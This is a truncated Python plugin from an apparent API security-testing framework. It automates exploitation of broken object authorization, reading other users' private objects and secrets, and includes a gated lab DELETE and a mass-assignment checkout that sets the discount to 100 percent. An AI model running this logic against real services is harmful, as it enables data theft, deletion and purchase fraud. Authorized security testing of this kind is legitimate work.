"""Closed URL-only REST object-authorization probe (#1291).

The probe accepts only a workflow root URL plus server-owned policy/authentication
fields.  It discovers a local OpenAPI document, derives one authenticated
self/list/direct GET tuple, and proves that an object omitted from the current
user's list remains directly readable.  The only write is an optional, fully
gated lab DELETE explicitly declared by the same OpenAPI operation.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import secrets
import socket
import ssl
from html.parser import HTMLParser
from typing import Any, Dict, Iterable, List, NamedTuple, Optional, Tuple
from urllib.parse import quote, urljoin, urlsplit

from plugin_interface import ToolPlugin
from tools.web_request_smuggling_probe import read_http_response


MODE = "documented-object-authz-v1"
MASS_ASSIGNMENT_MODE = "mass-assignment-discount-v1"
RUNTIME_PROOF = "runtime-read-only"
LAB_PROOF = "lab-state-change"
USER_AGENT = "xASM-API-Testing-Probe/1.0"
DOC_PATHS = ("/openapi.json", "/api/openapi.json", "/swagger.json", "/api-docs", "/api")
MAX_REQUEST_BUDGET = 32
MAX_BODY_BYTES = 250_000
MAX_EVIDENCE_CHARS = 18_000
ID_FIELDS = ("id", "userId", "user_id", "objectId", "object_id", "username")
PRIVATE_FIELDS = ("isPrivate", "private", "is_private")
SENSITIVE_FIELD_RE = re.compile(
    r"(?i)(?:email|password|passcode|secret|token|recovery|reset|private[_-]?key|api[_-]?key|credential|owner)"
)
SENSITIVE_HEADER_RE = re.compile(
    r"(?im)^(authorization|cookie|set-cookie|proxy-authorization|x-csrf-token)\s*:.*$"
)
EMAIL_RE = re.compile(r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b")
TOKEN_RE = re.compile(r"\b(?:eyJ[A-Za-z0-9_-]{20,}|[A-Za-z0-9_+/.=-]{40,})\b")


class ResourceTuple(NamedTuple):
    self_path: str
    list_path: str
    direct_template: str
    parameter_name: str
    candidates: Tuple[Any, ...]
    delete_allowed: bool


class _ProductCardParser(HTMLParser):
    """Collect bounded div/section/article cards with exactly one product link."""

    def __init__(self, base_url: str):
        super().__init__(convert_charrefs=True)
        self.base_url = base_url
        self.stack: List[Dict[str, Any]] = []
        self.cards: List[Tuple[str, str, str]] = []

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        if tag in {"div", "section", "article", "li"}:
            self.stack.append({"tag": tag, "text": [], "links": []})
        attrs_map = {str(key).lower(): str(value or "") for key, value in attrs}
        if tag == "a" and self.stack:
            href = attrs_map.get("href", "")
            parsed = urlsplit(urljoin(self.base_url, href))
            product_id = next(
                (
                    value
                    for key, value in re.findall(r"(?:^|&)([^=&]+)=([^&]*)", parsed.query)
                    if key.lower() == "productid" and value
                ),
                None,
            )
            if product_id:
                absolute = urljoin(self.base_url, href)
                for frame in self.stack:
                    frame["links"].append((absolute, product_id))

    def handle_data(self, data: str) -> None:
        for frame in self.stack:
            frame["text"].append(data)

    def handle_endtag(self, tag: str) -> None:
        if not self.stack:
            return
        index = next((i for i in range(len(self.stack) - 1, -1, -1) if self.stack[i]["tag"] == tag), -1)
        if index < 0:
            return
        frame = self.stack[index]
        del self.stack[index:]
        links = list(dict.fromkeys(frame["links"]))
        if len(links) == 1:
            self.cards.append((links[0][0], links[0][1], " ".join(frame["text"])))


def _sha(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()


def _bounded_int(value: Any, default: int, low: int, high: int) -> int:
    try:
        return max(low, min(int(value), high))
    except (TypeError, ValueError):
        return default


def _validate_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > 4096 or any(ch in raw for ch in "\r\n\0"):
        return None
    try:
        parsed = urlsplit(raw)
    except ValueError:
        return None
    if (
        parsed.scheme not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
    ):
        return None
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"


def _origin(url: str) -> str:
    parsed = urlsplit(url)
    return f"{parsed.scheme}://{parsed.netloc}/"


def _marker(value: str) -> str:
    return f"[REDACTED sha256={_sha(value)} len={len(value)}]"


def _redact(value: str, secret: Optional[str] = None) -> str:
    safe = str(value or "").replace("\0", "")
    safe = SENSITIVE_HEADER_RE.sub(lambda m: f"{m.group(1)}: <redacted-runtime-secret>", safe)
    # PortSwigger lab hostnames are long enough to look like high-entropy
    # tokens to TOKEN_RE. Host is proof-critical same-origin metadata, not a
    # credential, so preserve only syntactically valid HTTP Host header values
    # while the generic secret redactor processes the rest of the transcript.
    preserved_hosts: List[Tuple[str, str]] = []
    for index, match in enumerate(
        re.finditer(r"(?im)^Host:\s*([A-Za-z0-9.-]+(?::[0-9]{1,5})?)\s*$", safe)
    ):
        host = match.group(1)
        sentinel_host = f"<xasm-api-host-{index}>"
        if host not in [row[0] for row in preserved_hosts]:
            preserved_hosts.append((host, sentinel_host))
            safe = safe.replace(f"Host: {host}", f"Host: {sentinel_host}")
    preserved_paths: List[Tuple[str, str]] = []
    for index, match in enumerate(
        re.finditer(
            r"/(?:\.xasm-api-negative-[0-9a-f]{24}|[^\s?]*xasm-not-found-(?:[0-9]+|[0-9a-f]{24}))",
            safe,
        )
    ):
        path = match.group(0)
        sentinel_path = f"<xasm-api-control-path-{index}>"
        if path not in [row[0] for row in preserved_paths]:
            preserved_paths.append((path, sentinel_path))
            safe = safe.replace(path, sentinel_path)
    sentinel = "<xasm-api-sensitive-value>"
    marker = None
    if secret:
        marker = _marker(secret)
        safe = safe.replace(secret, sentinel).replace(quote(secret, safe=""), sentinel)
    safe = EMAIL_RE.sub(lambda m: _marker(m.group(0)), safe)
    safe = TOKEN_RE.sub(lambda m: _marker(m.group(0)), safe)
    if marker:
        safe = safe.replace(sentinel, marker)
    for host, sentinel_host in preserved_hosts:
        safe = safe.replace(sentinel_host, host)
    for path, sentinel_path in preserved_paths:
        safe = safe.replace(sentinel_path, path)
    return safe[:MAX_EVIDENCE_CHARS]


def _json_object(body: str) -> Optional[Dict[str, Any]]:
    try:
        value = json.loads(body)
    except (TypeError, ValueError):
        return None
    return value if isinstance(value, dict) else None


def _json_list(body: str) -> Optional[List[Any]]:
    try:
        value = json.loads(body)
    except (TypeError, ValueError):
        return None
    if isinstance(value, list):
        return value
    if isinstance(value, dict):
        for key in ("items", "users", "objects", "results", "data"):
            if isinstance(value.get(key), list):
                return value[key]
    return None


def _html_attribute(source: str, name: str) -> Optional[str]:
    """Return one quoted or HTML-valid unquoted attribute value."""
    match = re.search(
        rf'''(?i)\b{re.escape(name)}\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))''',
        source,
    )
    if not match:
        return None
    return next((value for value in match.groups() if value is not None), None)


def _operation_secured(document: Dict[str, Any], operation: Any) -> bool:
    if not isinstance(operation, dict):
        return False
    security = operation.get("security", document.get("security"))
    return isinstance(security, list) and bool(security)


def _path_parameter(path: str, item: Dict[str, Any], operation: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    names = re.findall(r"\{([^{}]+)\}", path)
    if len(names) != 1:
        return None
    parameters = [*(item.get("parameters") or []), *(operation.get("parameters") or [])]
    for parameter in parameters:
        if (
            isinstance(parameter, dict)
            and parameter.get("in") == "path"
            and str(parameter.get("name")) == names[0]
        ):
            return parameter
    return None


def _parameter_candidates(parameter: Dict[str, Any]) -> List[Any]:
    schema = parameter.get("schema") if isinstance(parameter.get("schema"), dict) else {}
    raw: List[Any] = []
    for source in (parameter, schema):
        if "example" in source:
            raw.append(source["example"])
        examples = source.get("examples")
        if isinstance(examples, list):
            raw.extend(examples)
        elif isinstance(examples, dict):
            for row in examples.values():
                raw.append(row.get("value") if isinstance(row, dict) else row)
        if isinstance(source.get("enum"), list):
            raw.extend(source["enum"])
        if "default" in source:
            raw.append(source["default"])
    output: List[Any] = []
    for value in raw:
        if isinstance(value, (str, int)) and not isinstance(value, bool) and str(value).strip():
            if value not in output:
                output.append(value)
    return output[:12]


class ApiTestingProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "api:testing_probe"

    @property
    def description(self) -> str:
        return (
            "Discovers a documented authenticated REST object tuple from a root URL "
            "and proves one bounded list-versus-direct authorization differential."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "format": "uri"},
                "mode": {"type": "string", "enum": [MODE], "default": MODE},
                "proofLevel": {
                    "type": "string", "enum": [RUNTIME_PROOF, LAB_PROOF], "default": RUNTIME_PROOF,
                },
                "engagement": {
                    "type": "string", "enum": ["standard", "aggressive", "lab", "ctf"],
                    "default": "standard", "x-workflow-owned": True,
                },
                "discoverFromTarget": {"type": "boolean", "default": True, "x-workflow-owned": True},
                "requestBudget": {
                    "type": "integer", "minimum": 10, "maximum": MAX_REQUEST_BUDGET,
                    "default": 32, "x-workflow-owned": True,
                },
                "documentationBudget": {
                    "type": "integer", "minimum": 1, "maximum": 8,
                    "default": 6, "x-workflow-owned": True,
                },
                "endpointBudget": {
                    "type": "integer", "minimum": 1, "maximum": 8,
                    "default": 8, "x-workflow-owned": True,
                },
                "objectBudget": {
                    "type": "integer", "minimum": 1, "maximum": 12,
                    "default": 5, "x-workflow-owned": True,
                },
                "maxResponseBytes": {
                    "type": "integer", "minimum": 4096, "maximum": MAX_BODY_BYTES,
                    "default": 96000, "x-workflow-owned": True,
                },
                "stopAfterFirstFinding": {"type": "boolean", "default": True, "x-workflow-owned": True},
                "allowUnsafeMethods": {"type": "boolean", "default": False, "x-workflow-owned": True},
                "stateChangeApproved": {"type": "boolean", "default": False, "x-workflow-owned": True},
                "solutionSubmitApproved": {"type": "boolean", "default": False, "x-workflow-owned": True},
                "allowMassAssignmentDiscountFallback": {
                    "type": "boolean", "default": False,
                    "x-hidden": True, "x-workflow-owned": True,
                },
                "authCookies": {
                    "type": "string", "x-hidden": True, "x-workflow-owned": True,
                },
                "authHeaders": {
                    "type": "object", "additionalProperties": {"type": "string"},
                    "x-hidden": True, "x-workflow-owned": True,
                },
            },
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "dast-api", "phase": 3, "domain": ["api", "web"],
            "input_type": ["url"], "output_type": ["findings"],
            "chainable_after": ["api:discover", "browser:traffic_capture"],
            "chainable_before": ["decision:"],
            "taxonomy_domain": ["api", "web"], "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Prove documented REST object authorization differentials",
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        target = _validate_target(parameters.get("target"))
        if not target:
            return self._error("target must be a credential-free HTTP(S) URL without query or fragment")
        if str(parameters.get("mode") or MODE) != MODE:
            return self._error(f"mode must be {MODE}", target)
        proof_level = str(parameters.get("proofLevel") or RUNTIME_PROOF)
        if proof_level not in {RUNTIME_PROOF, LAB_PROOF}:
            return self._error("unsupported proofLevel", target)
        engagement = str(parameters.get("engagement") or "standard").lower()
        if engagement not in {"standard", "aggressive", "lab", "ctf"}:
            return self._error("unsupported engagement", target)
        auth, auth_error = self._auth_context(parameters)
        if auth_error:
            return self._error(auth_error, target)
        self._auth_headers = auth
        self._auth_context_sha = _sha(
            "\n".join(f"{k.lower()}:{v}" for k, v in sorted(auth.items()))
            if auth else _origin(target) + ":anonymous-fixed-principal"
        )
        self._budget = _bounded_int(parameters.get("requestBudget"), 32, 10, 32)
        self._doc_budget = _bounded_int(parameters.get("documentationBudget"), 6, 1, 8)
        self._endpoint_budget = _bounded_int(parameters.get("endpointBudget"), 8, 1, 8)
        self._candidate_budget = _bounded_int(parameters.get("objectBudget"), 5, 1, 12)
        self._max_body = _bounded_int(parameters.get("maxResponseBytes"), 96000, 4096, MAX_BODY_BYTES)
        self._requests = 0
        self._state_changing_methods: List[str] = []
        self._timeout = 20
        self._target = target
        try:
            await self._pin_target(target)
            root = await self._request("GET", target)
            negative_url = urljoin(_origin(target), ".xasm-api-negative-" + secrets.token_hex(12))
            negative = await self._request("GET", negative_url)
            if root["status"] < 200 or root["status"] >= 400 or negative["status"] < 400:
                return self._result(target, proof_level, "root or randomized negative control was not stable")
            doc_response, document = await self._discover_document(root)
            if not doc_response or not document:
                return await self._mass_or_result(
                    parameters, target, proof_level, engagement,
                    "no bounded same-origin OpenAPI document",
                )
            resource = self._derive_resource_tuple(document)
            if not resource:
                return await self._mass_or_result(
                    parameters, target, proof_level, engagement,
                    "no secured self/list/direct GET resource tuple",
                )
            self_response = await self._request("GET", self._url(resource.self_path), authenticated=True)
            list_response = await self._request("GET", self._url(resource.list_path), authenticated=True)
            self_object = _json_object(self_response["body"])
            listed = _json_list(list_response["body"])
            id_field = self._id_field(self_object)
            if not self_object or listed is None or not id_field:
                return await self._mass_or_result(
                    parameters, target, proof_level, engagement,
                    "self/list controls did not return the documented object shape",
                )
            self_id = self_object.get(id_field)
            listed_ids = [row.get(id_field) for row in listed if isinstance(row, dict) and id_field in row]
            if self_id is None or self_id not in listed_ids:
                return await self._mass_or_result(
                    parameters, target, proof_level, engagement,
                    "current object was absent from the authenticated list control",
                )
            candidates = self._candidate_values(resource.candidates, listed_ids, self_id)
            not_found_id = self._not_found_value(candidates + listed_ids + [self_id])
            not_found = await self._request(
                "GET", self._url(self._fill(resource.direct_template, resource.parameter_name, not_found_id)),
                authenticated=True,
            )
            if not self._clean_not_found(not_found):
                return await self._mass_or_result(
                    parameters, target, proof_level, engagement,
                    "tool-derived nonexistent-object control was not rejected cleanly",
                )
            for candidate in candidates[: self._candidate_budget]:
                if candidate == self_id or candidate in listed_ids or self._requests + 2 > self._budget:
                    continue
                direct_url = self._url(self._fill(resource.direct_template, resource.parameter_name, candidate))
                proof = await self._request("GET", direct_url, authenticated=True)
                foreign = _json_object(proof["body"])
                foreign_values = self._foreign_values(foreign, id_field, candidate)
                if not foreign_values:
                    continue
                private_field, sensitive_field, secret = foreign_values
                repeat = await self._request("GET", direct_url, authenticated=True)
                if repeat["status"] != 200 or repeat["bodyBytes"] != proof["bodyBytes"]:
                    continue
                fields = (id_field, private_field, sensitive_field)
                verification = self._verification(
                    resource, root, negative, doc_response, self_response, list_response,
                    not_found, proof, repeat, fields, self_id, listed_ids, candidate, secret,
                    proof_level,
                )
                lab = await self._maybe_delete_lab(
                    parameters, proof_level, engagement, resource, target, root, candidate, secret
                )
                verification["apiEvidence"]["steps"].extend(lab.pop("steps"))
                verification.update(lab)
                verification["requestCount"] = self._requests
                effective_proof_level = LAB_PROOF if verification["labSolvedTransition"] else RUNTIME_PROOF
                verification["proofLevel"] = effective_proof_level
                finding = self._finding(target, verification)
                return {
                    "success": True, "tool": self.name, "target": target, "mode": MODE,
                    "proofLevel": effective_proof_level, "verified": True, "fallback": False,
                    "requestCount": self._requests, "findings": [finding], "total_findings": 1,
                    "verification": verification,
                    "summary": {"requests": self._requests, "findings": 1, "fallback": False},
                }
            return await self._mass_or_result(
                parameters, target, proof_level, engagement,
                "no omitted documented private object was directly readable",
            )
        except (OSError, ConnectionError, TimeoutError, ValueError, ssl.SSLError, json.JSONDecodeError) as exc:
            return self._error(f"bounded API testing probe failed: {type(exc).__name__}", target)

    def _auth_context(self, parameters: Dict[str, Any]) -> Tuple[Dict[str, str], Optional[str]]:
        output: Dict[str, str] = {}
        cookies = parameters.get("authCookies")
        if cookies is not None:
            if not isinstance(cookies, str) or not cookies.strip() or any(ch in cookies for ch in "\r\n\0"):
                return {}, "invalid server-injected authCookies"
            output["Cookie"] = cookies.strip()
        headers = parameters.get("authHeaders")
        if headers is not None:
            if not isinstance(headers, dict):
                return {}, "invalid server-injected authHeaders"
            for key, value in headers.items():
                name, content = str(key), str(value)
                if name.lower() != "authorization" or any(ch in name + content for ch in "\r\n\0"):
                    return {}, "server-injected authHeaders may contain only Authorization"
                output["Authorization"] = content
        return output, None

    async def _discover_document(self, root: Dict[str, Any]):
        # The coordinator may hand us a same-origin OpenAPI/Swagger URL found
        # during RECON_API/RECON_EXPLORE. Preserve it ahead of the fallback
        # catalog so discovery evidence is consumed instead of repeated.
        target_path = urlsplit(self._target).path or "/"
        candidates = (
            [target_path, *DOC_PATHS]
            if target_path not in {"", "/"} and target_path not in DOC_PATHS
            else list(DOC_PATHS)
        )
        html = root.get("body") or ""
        for value in re.findall(r'''(?:href|src)=["']([^"']+)["']''', html, re.I):
            absolute = urljoin(self._target, value)
            if _origin(absolute) == _origin(self._target) and re.search(r"(?i)(?:openapi|swagger|api-doc)", absolute):
                candidates.append(urlsplit(absolute).path)
        seen = set()
        for path in candidates:
            if len(seen) >= self._doc_budget or self._requests >= self._budget:
                break
            url = self._url(path)
            if url in seen:
                continue
            seen.add(url)
            response = await self._request("GET", url, authenticated=True)
            document = _json_object(response["body"])
            if response["status"] == 200 and self._valid_document(document):
                return response, document
        return None, None

    def _valid_document(self, document: Optional[Dict[str, Any]]) -> bool:
        if not document or not isinstance(document.get("paths"), dict):
            return False
        if not (document.get("openapi") or document.get("swagger")):
            return False
        server_groups: List[Any] = [document.get("servers")]
        for item in document["paths"].values():
            if not isinstance(item, dict):
                continue
            server_groups.append(item.get("servers"))
            for method in ("get", "delete"):
                operation = item.get(method)
                if isinstance(operation, dict):
                    server_groups.append(operation.get("servers"))
        for group in server_groups:
            if group is None:
                continue
            if not isinstance(group, list):
                return False
            for server in group:
                raw = str(server.get("url") or "") if isinstance(server, dict) else ""
                if not raw or "{" in raw or _origin(urljoin(_origin(self._target), raw)) != _origin(self._target):
                    return False
        return True

    def _derive_resource_tuple(self, document: Dict[str, Any]) -> Optional[ResourceTuple]:
        paths = document.get("paths") or {}
        directs: List[Tuple[str, str, Dict[str, Any], Dict[str, Any]]] = []
        for path, item in paths.items():
            if not isinstance(path, str) or not path.startswith("/") or not isinstance(item, dict):
                continue
            get = item.get("get")
            parameter = _path_parameter(path, item, get) if isinstance(get, dict) else None
            if parameter and _operation_secured(document, get):
                directs.append((path, str(parameter["name"]), parameter, item))
        for direct, parameter_name, parameter, item in directs:
            list_path = direct[: direct.rfind("/")] or "/"
            list_op = (paths.get(list_path) or {}).get("get") if isinstance(paths.get(list_path), dict) else None
            if not _operation_secured(document, list_op):
                continue
            prefix = list_path.rstrip("/") + "/"
            self_paths = []
            for path, row in paths.items():
                get = row.get("get") if isinstance(row, dict) else None
                operation_id = str((get or {}).get("operationId") or "").lower()
                if (
                    isinstance(path, str) and "{" not in path and _operation_secured(document, get)
                    and (path in {prefix + "me", prefix + "self", prefix + "current"}
                         or any(word in operation_id for word in ("current", "self", "me")))
                ):
                    self_paths.append(path)
            if not self_paths:
                continue
            delete = item.get("delete")
            delete_allowed = _operation_secured(document, delete)
            return ResourceTuple(
                self_paths[0], list_path, direct, parameter_name,
                tuple(_parameter_candidates(parameter)), delete_allowed,
            )
        return None

    def _id_field(self, value: Optional[Dict[str, Any]]) -> Optional[str]:
        if not value:
            return None
        return next((name for name in ID_FIELDS if name in value), None)

    def _candidate_values(self, documented: Iterable[Any], listed: List[Any], self_id: Any) -> List[Any]:
        output: List[Any] = []
        for value in [*documented]:
            if value not in output:
                output.append(value)
        numeric = []
        for value in [*listed, self_id]:
            try:
                number = int(value)
            except (TypeError, ValueError):
                continue
            if 0 <= number <= 100_000:
                numeric.append(number)
        if numeric:
            for number in range(min(numeric), min(100_000, max(numeric) + self._candidate_budget) + 1):
                if number not in numeric and number not in output:
                    output.append(number)
        return output[: self._candidate_budget]

    def _not_found_value(self, values: List[Any]) -> Any:
        numeric = []
        for value in values:
            try:
                numeric.append(int(value))
            except (TypeError, ValueError):
                pass
        if numeric:
            return max(1_000_000, max(numeric) + 100_000 + secrets.randbelow(10_000))
        # Keep the randomized control distinguishable without producing a
        # long high-entropy request-target that the persistence redactor must
        # conservatively treat as a credential-shaped token.
        return "xasm-missing-" + secrets.token_hex(6)

    def _clean_not_found(self, response: Dict[str, Any]) -> bool:
        if response["status"] in {404, 410}:
            return True
        value = _json_object(response["body"])
        return response["status"] == 200 and (
            value is None or (len(value) == 1 and next(iter(value.values())) is None)
        )

    def _foreign_values(
        self, value: Optional[Dict[str, Any]], id_field: str, candidate: Any
    ) -> Optional[Tuple[str, str, str]]:
        if not value:
            return None
        private_field = next((name for name in PRIVATE_FIELDS if value.get(name) is True), None)
        sensitive_candidates = [
            name for name, item in value.items()
            if name != id_field and isinstance(item, str) and len(item.strip()) >= 4
            and SENSITIVE_FIELD_RE.search(name)
        ]
        sensitive_candidates.sort(
            key=lambda name: (
                0 if re.search(r"(?i)(?:password|passcode|secret|token|recovery|private[_-]?key|api[_-]?key|credential)", name)
                else 1,
                name,
            )
        )
        sensitive_field = sensitive_candidates[0] if sensitive_candidates else None
        if (
            str(value.get(id_field)) != str(candidate)
            or not private_field
            or not sensitive_field
        ):
            return None
        secret = value.get(sensitive_field)
        return private_field, sensitive_field, secret.strip()

    async def _maybe_delete_lab(
        self, parameters, proof_level, engagement, resource, target, root, candidate, secret
    ) -> Dict[str, Any]:
        solved_before = self._is_solved(root["body"])
        output = {
            "solvedBefore": solved_before, "effectTriggered": False,
            "solvedAfter": solved_before, "labSolvedTransition": False, "steps": [],
        }
        approved = (
            proof_level == LAB_PROOF and engagement in {"lab", "ctf"}
            and parameters.get("allowUnsafeMethods") is True
            and parameters.get("stateChangeApproved") is True
            and parameters.get("solutionSubmitApproved") is True
            and resource.delete_allowed and not solved_before
        )
        if not approved:
            return output
        # Capture a fresh pre-effect bracket instead of reusing the discovery
        # root exchange. This makes request accounting monotonic and gives the
        # backend an independent unsolved control immediately before the only
        # approved state change.
        before = await self._request("GET", target)
        solved_before = self._is_solved(before["body"])
        if solved_before:
            output.update({"solvedBefore": True, "solvedAfter": True})
            return output
        delete_url = self._url(self._fill(resource.direct_template, resource.parameter_name, candidate))
        delete = await self._request("DELETE", delete_url, authenticated=True)
        after = await self._request("GET", target)
        solved_after = self._is_solved(after["body"])
        output.update({
            "effectTriggered": delete["status"] in {200, 202, 204} and solved_after,
            "solvedAfter": solved_after,
            "solvedBefore": solved_before,
            "labSolvedTransition": not solved_before and solved_after,
            "labActionApproved": True,
            "steps": [
                self._evidence("lab-unsolved-control", before, secret),
                self._evidence("lab-approved-delete-submit", delete, secret),
                self._evidence("lab-solved-confirmation", after, secret),
            ],
        })
        return output

    def _verification(
        self, resource, root, negative, doc, self_response, list_response, not_found,
        proof, repeat, fields, self_id, listed_ids, candidate, secret, proof_level,
    ) -> Dict[str, Any]:
        id_field, private_field, sensitive_field = fields
        steps = [
            self._evidence("api-root-baseline", root),
            self._evidence("api-random-path-negative-control", negative),
            self._evidence("api-documentation-discovery", doc),
            self._evidence(
                "api-self-object-control", self_response,
                body_override=json.dumps({id_field: self_id}, separators=(",", ":")),
            ),
            self._evidence(
                "api-list-control", list_response,
                body_override=json.dumps(
                    [{id_field: value} for value in listed_ids], separators=(",", ":")
                ),
            ),
            self._evidence("api-direct-not-found-control", not_found),
            self._evidence(
                "api-foreign-object-proof", proof, secret,
                body_override=json.dumps(
                    {id_field: candidate, private_field: True, sensitive_field: secret},
                    separators=(",", ":"),
                ),
            ),
            self._evidence(
                "api-foreign-object-repeat", repeat, secret,
                body_override=json.dumps(
                    {id_field: candidate, private_field: True, sensitive_field: secret},
                    separators=(",", ":"),
                ),
            ),
        ]
        return {
            "verified": True, "mode": MODE, "proofLevel": proof_level,
            "endpointUrl": self._url(resource.direct_template),
            "selfPath": resource.self_path, "listPath": resource.list_path,
            "directPathTemplate": resource.direct_template,
            "idField": id_field, "privateField": private_field,
            "sensitiveField": sensitive_field,
            "selfObjectId": self_id, "foreignObjectId": candidate,
            "listContainsSelf": True, "listOmittedForeignObject": True,
            "directForeignObjectReturned": True, "repeatStable": True,
            "nonexistentControlRejected": True, "documentedDeleteAllowed": resource.delete_allowed,
            "sensitiveValueSha256": _sha(secret), "sensitiveValueLength": len(secret),
            "authContextSha256": self._auth_context_sha,
            "networkDestinationPreserved": True, "destinationIpPinned": True,
            "tlsSniPreserved": urlsplit(self._target).scheme == "https",
            "fallback": False, "apiEvidence": {"version": 1, "steps": steps},
        }

    async def _mass_or_result(
        self, parameters: Dict[str, Any], target: str, proof_level: str,
        engagement: str, reason: str,
    ) -> Dict[str, Any]:
        approved = (
            proof_level == LAB_PROOF
            and engagement in {"lab", "ctf"}
            and parameters.get("allowUnsafeMethods") is True
            and parameters.get("stateChangeApproved") is True
            and parameters.get("solutionSubmitApproved") is True
            and parameters.get("allowMassAssignmentDiscountFallback") is True
            and bool(self._auth_headers)
        )
        if not approved:
            return self._result(target, proof_level, reason)
        mass = await self._mass_assignment_discount(parameters, target, engagement)
        return mass if mass is not None else self._result(
            target, proof_level, reason + "; no bounded mass-assignment discount proof"
        )

    async def _mass_assignment_discount(
        self, parameters: Dict[str, Any], target: str, engagement: str,
    ) -> Optional[Dict[str, Any]]:
        # A fresh authenticated root brackets the state-changing sequence and
        # also supplies the product catalog. No write occurs before all of the
        # structural discovery checks below have passed.
        root = await self._request("GET", target, authenticated=True)
        if root["status"] != 200 or self._is_solved(root["body"]):
            return None

        index = await self._request("GET", self._url("/api/"), authenticated=True)
        if index["status"] != 200:
            return None
        index_lower = index["body"].lower()
        if "/checkout" not in index_lower or "get" not in index_lower or "post" not in index_lower:
            return None
        order_doc_url = self._linked_order_document(index["body"], index["url"])
        if not order_doc_url:
            return None
        order_doc = await self._request("GET", order_doc_url, authenticated=True)
        order_lower = order_doc["body"].lower()
        if (
            order_doc["status"] != 200
            or "chosen_discount" not in order_lower
            or "percentage" not in order_lower
        ):
            return None

        product = self._highest_priced_product(root["body"], target)
        if not product:
            return None
        product_url, product_id, price_minor = product
        product_page = await self._request("GET", product_url, authenticated=True)
        cart = self._cart_form(product_page["body"], product_page["url"], product_id)
        if not cart:
            return None
        cart_url, product_field, quantity_field, observed_product_id, cart_fields = cart
        if str(observed_product_id) != str(product_id):
            return None

        checkout_url = self._url("/api/checkout")
        # Validate the authoritative pre-write checkout contract before adding
        # anything. Empty-basket responses are allowed here, but the operation
        # must exist and be authenticated.
        pre_checkout = await self._request("GET", checkout_url, authenticated=True)
        pre_order = _json_object(pre_checkout["body"])
        pre_discount = pre_order.get("chosen_discount") if pre_order else None
        if (
            pre_checkout["status"] != 200
            or not isinstance(pre_discount, dict)
            or isinstance(pre_discount.get("percentage"), bool)
            or not isinstance(pre_discount.get("percentage"), (int, float))
        ):
            return None

        cart_body = self._form_body(
            [(name, "1" if name == quantity_field else value) for name, value in cart_fields]
        )
        cart_submit = await self._request(
            "POST", cart_url, authenticated=True, raw_body=cart_body,
            content_type="application/x-www-form-urlencoded",
        )
        if cart_submit["status"] < 200 or cart_submit["status"] >= 400:
            return None

        checkout = await self._request("GET", checkout_url, authenticated=True)
        order = _json_object(checkout["body"])
        if checkout["status"] != 200 or not self._valid_checkout_order(order, product_id):
            return None
        discount = order.get("chosen_discount")
        original_percentage = discount.get("percentage")
        if isinstance(original_percentage, bool) or not isinstance(original_percentage, (int, float)):
            return None
        submitted = json.loads(json.dumps(order))
        submitted["chosen_discount"]["percentage"] = 100
        submit_body = json.dumps(submitted, separators=(",", ":"))
        checkout_submit = await self._request(
            "POST", checkout_url, authenticated=True, raw_body=submit_body,
            content_type="application/json",
        )
        after = await self._request("GET", target, authenticated=True)
        solved_after = self._is_solved(after["body"])
        if checkout_submit["status"] not in {200, 201, 202, 204} or not solved_after:
            return None

        baseline_canonical = json.dumps(order, sort_keys=True, separators=(",", ":"))
        submitted_canonical = json.dumps(submitted, sort_keys=True, separators=(",", ":"))
        steps = [
            self._evidence("api-mass-assignment-root-unsolved-control", root),
            self._evidence("api-mass-assignment-endpoint-documentation", index),
            self._evidence("api-mass-assignment-order-schema", order_doc),
            self._evidence("api-mass-assignment-product-catalog", root),
            self._evidence("api-mass-assignment-add-to-cart-form", product_page),
            self._evidence("api-mass-assignment-cart-submit", cart_submit),
            self._evidence("api-mass-assignment-checkout-baseline", checkout),
            self._evidence("api-mass-assignment-discount-submit", checkout_submit),
            self._evidence("api-mass-assignment-solved-confirmation", after),
        ]
        verification = {
            "verified": True, "mode": MASS_ASSIGNMENT_MODE, "proofLevel": LAB_PROOF,
            "docsUrl": index["url"], "orderDocumentationUrl": order_doc["url"],
            "catalogUrl": root["url"], "productUrl": product_page["url"],
            "cartUrl": cart_url, "checkoutUrl": checkout_url,
            "productIdSha256": _sha(str(product_id)), "productPriceMinor": price_minor,
            "productField": product_field, "quantityField": quantity_field,
            "discountFieldPath": "chosen_discount.percentage",
            "originalPercentage": original_percentage, "injectedPercentage": 100,
            "baselineOrderSha256": _sha(baseline_canonical),
            "submittedOrderSha256": _sha(submitted_canonical),
            "authContextSha256": self._auth_context_sha,
            "cartFormObserved": True, "checkoutSchemaVerified": True,
            "allowUnsafeMethods": True, "stateChangeApproved": True,
            "solutionSubmitApproved": True,
            "stateChangingRequestCount": len(self._state_changing_methods),
            "stateChangingMethods": list(self._state_changing_methods),
            "solvedBefore": False, "effectTriggered": True, "solvedAfter": True,
            "labSolvedTransition": True, "labActionApproved": True,
            "networkDestinationPreserved": True, "destinationIpPinned": True,
            "tlsSniPreserved": urlsplit(target).scheme == "https",
            "requestCount": self._requests, "fallback": False,
            "apiEvidence": {"version": 1, "steps": steps},
        }
        finding = self._mass_assignment_finding(target, verification)
        return {
            "success": True, "tool": self.name, "target": target,
            "mode": MASS_ASSIGNMENT_MODE, "proofLevel": LAB_PROOF,
            "verified": True, "fallback": False, "requestCount": self._requests,
            "findings": [finding], "total_findings": 1, "verification": verification,
            "summary": {"requests": self._requests, "findings": 1, "fallback": False},
        }

    def _linked_order_document(self, html: str, base_url: str) -> Optional[str]:
        candidates: List[str] = []
        for match in re.finditer(r'''href\s*=\s*["']([^"']+)["']''', html, re.I):
            value = match.group(1)
            absolute = urljoin(base_url, value)
